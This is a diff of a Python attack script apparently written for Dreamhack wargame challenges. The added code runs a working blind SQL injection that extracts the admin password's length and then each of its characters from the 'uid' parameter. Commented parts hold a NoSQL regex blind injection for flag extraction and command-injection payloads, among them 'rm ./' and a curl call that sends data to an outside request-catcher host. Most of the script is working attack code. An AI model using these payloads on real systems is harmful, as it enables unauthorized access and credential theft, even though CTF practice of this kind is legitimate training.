@@ -3,7 +3,7 @@ import re
 import string, json
 
 host = 'http://host3.dreamhack.games'
-port = '10214'
+port = '8402'
 url = host+':'+port
 headers = {'Content-Type': 'application/json; charset=utf-8'}
 cookies = {
@@ -37,13 +37,6 @@ payloadCommand = ['rm ./',
                   'whois https://naver.com',
                   '가나다']
 
-#for payload in payloadCommandInjection:
-#    data = {'host': '8.8.8.8'+payload}
-#    response = requests.post(url, data=data)
-#    print("================================================================")
-#    print("Command injection payload: " + payload)
-#    print(response.text)
-#
 
 payloadLocalhost = ['http://localhost',
                     'http://vcap.me',
@@ -54,7 +47,6 @@ payloadLocalhost = ['http://localhost',
                     'http://127.0.0.255'
                     'http://127.1',
                     ]
-regex_flag = re.compile('DH{.*}')
 ALPHANUMERIC = string.digits + string.ascii_letters
 flag = ''
 def refineResponse(text):
@@ -62,30 +54,72 @@ def refineResponse(text):
     text = re.sub('\n(\n|\s)*\n', '', text)
     return text
 def detector(text):
-    regex_flag
-# response = requests.get("http://host1.dreamhack.games:19500/", verify=False, cookies=cookies)
+    regex_flag = re.compile('(DH\{.*\}|Success|error)')
+    detectedTexts = regex_flag.findall(response.text)
+    return detectedTexts
+
+def printLog(payload, responseText):
+    print("================================================================")
+    print("payload: " + payload)
+    print(response.text)
+
+################################ CANVAS  ################################
+def existDetector(text):
+    regex_exist = re.compile('exists')
+    detectedTexts = regex_exist.findall(text)
+    return detectedTexts
+pwLength = 0
+for index in range(50):
+    payload = 'admin\' and char_length(upw)='+str(index)+';--'
+    params = {
+        'uid': payload}
+    response = requests.get(url, params = params, verify=False)
+    printLog(payload, refineResponse(response.text))
+    if len(existDetector(response.text))>0:
+        pwLength = index
+        break
+
+for nthPw in range(1, pwLength+1):
+    for index in range(128):
+        payload = 'admin\' and length(bin(ord(substr(upw, '+str(nthPw)+', 1))))='+str(index)+';--'
+        params = {'uid': payload}
+        response = requests.get(url, params = params, verify=False)
+        #printLog('nthPw: '+str(nthPw)+', index: '+str(index), refineResponse(response.text))
+        if len(existDetector(response.text))>0:
+            print(str(nthPw)+'th password: '+str(index))
+            break
+
+################################ PALETTE ################################
+
+# response = requests.get(url, params = params, cookies=cookies, verify=False)
+# response = requests.post(url, data=data)
+# response = requests.head(url, verify=False)
 # verify=False SSL 인증서 에러가 나서 추가해줬다.
 
-
-#if len(regex_flag.findall(response.text))>0:
-#    print("1")
-#    print(regex_flag.findall(response.text))
-#else:
-#    print("2")
-#    print(response.text)
-
+# Blind injection
 #for i in range(32):
 #    for char in ALPHANUMERIC:
- #       response = requests.get(host+':'+port+'/login?uid[$regex]=ad.in&upw[$regex]=^D.{'+flag+char+'.*}', verify=False)
-  #      if response.text.find('admin')!=-1:
-   #         flag += char
-    #        print(str(char))
-     #       break
+#        response = requests.get(host+':'+port+'/login?uid[$regex]=ad.in&upw[$regex]=^D.{'+flag+char+'.*}', verify=False)
+#        if response.text.find('admin')!=-1:
+#            flag += char
+#            print(str(char))
+#            break
 
-#print(response.text)
-response = requests.head(url+'?cmd= curl https://mjmqxqr.request.dreamhack.games -d "hello"', verify=False)
+################################ HISTORY ################################
+#for payload in payloadCommandInjection:
+#    data = {'host': '8.8.8.8'+payload}
+#    response = requests.post(url, data=data)
+#
+
+#if len(regex_flag.findall(response.text))>0:
+#    print(regex_flag.findall(response.text))
+#else:
+#    print(response.text)
+
 #for param in payloadCommand:
 #    params = {'cmd': param}
 #    print("================================================================")
 #    print("Command injection payload: " + param)
 #    print(refineResponse(response.text))
+
+# response = requests.head(url+'?cmd= curl https://mjmqxqr.request.dreamhack.games -d "hello"', verify=False)
